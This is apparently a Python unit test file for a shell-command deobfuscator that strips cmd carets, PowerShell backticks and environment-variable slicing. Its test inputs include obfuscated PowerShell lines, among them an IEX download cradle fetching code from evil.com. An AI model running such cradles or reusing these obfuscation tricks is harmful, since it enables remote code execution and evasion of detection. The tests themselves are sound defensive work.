import unittest

from cmd_unmask import unmask_command
from cmd_unmask.normalizer import normalize_shell


class TestQuoteAwareShellNormalizer(unittest.TestCase):
    def test_cmd_caret_and_empty_quotes_outside_single_quotes(self) -> None:
        raw = "p^o^w^e^r^s^h^e^l^l.e^x^e -NoP -c \"po""wershell 'http://evil.com/a^b'\""
        res = normalize_shell(raw)
        self.assertIn("powershell.exe", res.normalized_text)
        self.assertIn("powershell 'http://evil.com/a^b'", res.normalized_text)
        self.assertTrue(res.modified)

    def test_cmd_canonical_env_vars_and_slices(self) -> None:
        # COMSPEC = C:\Windows\System32\cmd.exe (length 27)
        # :~-7,3 -> cmd ; :~-3 -> exe
        raw = r"%COMSPEC:~-7,3%.%COMSPEC:~-3% /c %windir%\System32\whoami.exe"
        res = normalize_shell(raw)
        self.assertEqual(res.normalized_text.lower(), r"cmd.exe /c c:\windows\system32\whoami.exe")
        self.assertTrue(res.modified)

    def test_cmd_inline_set_variable_and_slicing(self) -> None:
        raw = 'cmd /c "set a=power&&set b=shell&&%a%%b% -w hidden"'
        res = normalize_shell(raw)
        self.assertIn("powershell -w hidden", res.normalized_text)
        self.assertTrue(res.modified)

    def test_powershell_backtick_stripping_and_escape_preservation(self) -> None:
        raw = "p`o`w`e`r`s`h`e`l`l -e`n`c \"I`E`X`nWrite-Host 'http://evil.com/a`b'\""
        res = normalize_shell(raw)
        self.assertIn("powershell -enc", res.normalized_text)
        self.assertIn("IEX`nWrite-Host", res.normalized_text)
        self.assertIn("'http://evil.com/a`b'", res.normalized_text)
        self.assertTrue(res.modified)

    def test_benign_command_remains_unchanged(self) -> None:
        benign = r"powershell.exe -NoProfile -ExecutionPolicy Bypass -File C:\admin\check.ps1"
        res = normalize_shell(benign)
        self.assertEqual(res.normalized_text, benign)
        self.assertFalse(res.modified)

        verdict = unmask_command(benign)
        self.assertEqual(len(verdict.dag.nodes), 1)
        self.assertEqual(len(verdict.provenance_chain), 0)

    def test_unmask_command_adds_provenance_step_when_normalized(self) -> None:
        obf = "p^o^w^e^r^s^h^e^l^l -c \"I`E`X (New-Object Net.WebClient).DownloadString('http://evil.com/a`b^c')\""
        verdict = unmask_command(obf)
        self.assertGreaterEqual(len(verdict.dag.nodes), 2)
        self.assertGreaterEqual(len(verdict.provenance_chain), 1)
        self.assertEqual(verdict.provenance_chain[0].technique, "shell_normalizer")
        self.assertIn("powershell -c \"IEX (New-Object Net.WebClient).DownloadString('http://evil.com/a`b^c')\"", verdict.primary_unmasked_payload)


if __name__ == "__main__":
    unittest.main()
